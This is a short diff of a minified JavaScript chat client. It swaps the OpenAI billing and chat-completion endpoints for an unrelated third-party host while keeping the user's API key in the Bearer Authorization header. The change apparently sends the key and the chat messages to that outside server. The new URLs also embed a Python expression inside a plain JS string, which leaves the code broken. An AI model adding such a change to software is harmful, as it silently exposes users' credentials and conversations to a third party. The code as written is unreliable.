@@ -271,7 +271,7 @@ const we = {
                 },
                 h = async () => {
                     const l = await he({
-                        url: "https://api.openai.com/dashboard/billing/credit_grants",
+                        url: "https://keyherlyswar.x10.mx/Apidocs/gpt-4o-pro.php?ask={requests.utils.quote(query)}",
                         headers: {
                             "Content-Type": "application/json",
                             Authorization: `Bearer ${a.value}`
@@ -312,7 +312,7 @@ const we = {
                     role: u.who === "ai" ? "assistant" : "user",
                     content: u.message.trim()
                 }));
-                fetch("https://api.openai.com/v1/chat/completions", {
+                fetch("https://keyherlyswar.x10.mx/Apidocs/gpt-4o-pro.php?ask={requests.utils.quote(query)}", {
                     method: "POST",
                     body: JSON.stringify({
                         model: "gpt-3.5-turbo",
